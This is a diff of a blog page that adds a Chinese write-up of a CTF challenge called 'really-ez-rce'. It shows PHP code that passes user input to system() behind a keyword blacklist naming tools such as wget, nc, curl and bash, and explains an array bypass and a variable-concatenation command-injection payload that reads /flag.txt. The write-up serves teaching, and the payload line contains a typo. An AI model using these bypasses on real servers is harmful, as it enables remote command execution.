@@ -452,7 +452,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    5
                 </div>
                 
 
@@ -482,7 +482,134 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h3 id="really-ez-rce题目"><a href="#really-ez-rce题目" class="headerlink" title="really-ez-rce题目"></a>really-ez-rce题目</h3><?php  
+header('Content-Type: text/html; charset=utf-8');  
+highlight_file(__FILE__);  
+error_reporting(0);  
+  
+if (isset($_REQUEST['Number'])) {    $inputNumber = $_REQUEST['Number'];  
+      
+    if (preg_match('/\d/', $inputNumber)) {  
+        die("不行不行,不能这样");  
+    }  
+  
+    if (intval($inputNumber)) {  
+        echo "OK,接下来你知道该怎么做吗";  
+          
+        if (isset($_POST['cmd'])) {            $cmd = $_POST['cmd'];  
+              
+            if (!preg_match(                '/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\{|\}|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\'|\"|id/i',                $cmd            )) {  
+                echo "你传的参数似乎挺正经的,放你过去吧<br>";                system($cmd);  
+            } else {  
+                echo "nonono,hacker!!!";  
+            }  
+        }  
+    }  
+}
+
+### 解题步骤
+#### 1.观察php代码
+未发现直接输出flag的地方，但有system命令，预估从命令行获取flag；
+发现两个可控参数，参数面临过滤；
+思考绕过方式；
+#### 绕过
+##### Number参数：
+第一部分：正则表达式匹配
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d/&#x27;</span>, <span class="variable">$inputNumber</span>)) &#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;不行不行,不能这样&quot;</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+- **`preg_match('/\d/', $inputNumber)`**：
+    
+    - 这是一个正则表达式匹配函数。
+        
+    - `'/\d/'` 是正则表达式，表示匹配任意一个数字（0-9）。
+        
+    - 如果 `$inputNumber` 中包含任何数字（即正则表达式匹配成功），则执行 `die("不行不行,不能这样");`。
+        
+    - `die()` 函数会终止脚本执行，并输出指定的字符串。
+        
+
+第二部分：整数检查
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$inputNumber</span>)) &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;OK,接下来你知道该怎么做吗&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+- **`intval($inputNumber)`**：
+    
+    - 这个函数会将 `$inputNumber` 转换为整数。
+        
+    - 如果 `$inputNumber` 转换为整数后的值不为 0，则条件为真。
+        
+    - 如果条件为真，会输出 `"OK,接下来你知道该怎么做吗"`。
+
+Number[]=1;利用数组绕过；
+原理解释
+
+当我们使用 `Number[]=1` 时，会发生以下过程：
+
+1. **数组传入：**
+    
+    - `$_REQUEST['Number']` 接收到的是一个数组 `array(1)`
+    - 而不是字符串 "1"
+2. **正则检查绕过：**
+    
+    - `preg_match()` 函数在处理数组时会报 Warning
+    - 由于 `error_reporting(0)` 错误被抑制
+    - `preg_match()` 返回 `false`，不会触发 die()
+3. **intval() 转换：**
+    
+    - `intval()` 对数组的处理会返回 1
+    - 这是因为 PHP 在将数组转换为整数时的默认行为
+    - 所以能够通过 `if (intval($inputNumber))` 的检查
+    ##### cmd参数
+    黑名单过滤一堆；使用命令替换和变量替换的技巧，最终生成了一个特定的文件路径；
+
+    1. **变量赋值部分**
+   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=a=c;b=at;c=f;d=lag;e=t;f=xt;g=l;h=s;i=h;j=ead;k=$($g<span class="variable">$h</span> -a | $i<span class="variable">$j</span> -n 1);$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure>
+   - `a=c;`：将变量 `a` 赋值为 `c`。
+   - `b=at;`：将变量 `b` 赋值为 `at`。
+   - `c=f;`：将变量 `c` 赋值为 `f`。
+   - `d=lag;`：将变量 `d` 赋值为 `lag`。
+   - `e=t;`：将变量 `e` 赋值为 `t`。
+   - `f=xt;`：将变量 `f` 赋值为 `xt`。
+   - `g=l;`：将变量 `g` 赋值为 `l`。
+   - `h=s;`：将变量 `h` 赋值为 `s`。
+   - `i=h;`：将变量 `i` 赋值为 `h`，即 `i=s`。
+   - `j=ead;`：将变量 `j` 赋值为 `ead`。
+   - `k=$($g$h -a | $i$j -n 1);`：这部分是关键，`$g$h` 被替换为 `ls`，`$i$j` 被替换为 `head`。因此，`k=$(ls -a | head -n 1)`，即 `k` 的值是 `ls -a` 命令输出的第一行内容。
+   - `$a$b`：`$a` 是 `c`，`$b` 是 `at`，因此 `$a$b` 是 `cat`。
+
+2. **最终命令部分**
+   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/$c$d$k$e<span class="variable">$f</span></span><br></pre></td></tr></table></figure>
+   - `$c` 是 `f`，`$d` 是 `lag`，`$k` 是 `ls -a` 输出的第一行内容，`$e` 是 `t`，`$f` 是 `xt`。
+   - 因此，`/$c$d$k$e$f` 被替换为 `/flag$ktxt`。
+
+3. **结合变量和命令替换**
+   - 最终的命令是：
+     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /flag$(<span class="built_in">ls</span> -a | <span class="built_in">head</span> -n 1)txt</span><br></pre></td></tr></table></figure>
+
+
+#### payload
+
+post提交中：
+Numbwe[]=1&cmd=a=c;b=at;c=f;d=lag;e=t;f=xt;g=l;h=s;i=h;j=ead;k=$($g$h -a | $i$j -n 1);$a$b /$c$d$k$e$f
+
+#### 总结
+1.数组绕过正则和intval();
+2.使用命令替换和变量替换的技巧，最终生成了一个特定的文件路径,绕过命令过滤
+3.为什么能取出一个点
+- `ls -a` 的输出中，第一行通常是 `.`（当前目录）。
+- 因此，`k=$(ls -a | head -n 1)` 的值是 `.`。
+- 最终命令中，`/flag$(ls -a | head -n 1)txt` 被替换为 `/flag.txt`，其中 `.` 是 `ls -a` 输出的第一行内容。
+
+
+### ez_php题目
+
+
+
+
+
+
                 
             </div>
             <hr/>
